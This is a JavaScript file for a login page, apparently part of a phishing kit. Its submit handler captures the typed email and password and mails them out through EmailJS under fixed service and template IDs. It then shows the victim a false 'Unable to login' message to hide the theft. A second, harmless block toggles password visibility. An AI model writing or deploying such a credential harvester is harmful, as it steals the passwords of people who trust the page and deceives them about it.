  document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form from submitting the traditional way

    // Collect the form data
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Prepare the email parameters
    var templateParams = {
      email: email,
      password: password,
    };

    // Send the email using EmailJS
    emailjs.send('service_wwqxm9j', 'template_kykvu6y', templateParams)
      .then(function(response) {
         console.log('SUCCESS!', response.status, response.text);
         alert("Unable to login");
      }, function(error) {
         console.log('FAILED...', error);
         alert("Failed to send Login.");
      });
  });






  let input = document.querySelector('#password')
  let btn = document.querySelector('#eye')
  let eyeClose = document.querySelector('#eyeClose').classList;


  btn.style.cursor = 'pointer';

  btn.addEventListener('click', () => {
      if (eyeClose.contains('fa-eye-slash')) {
          eyeClose.remove('fa-eye-slash')
          eyeClose.add('fa-eye')
          input.type = 'text'
      } else {
          eyeClose.add('fa-eye-slash');
          eyeClose.remove('fa-eye');
          input.type = 'password'
      }
  })


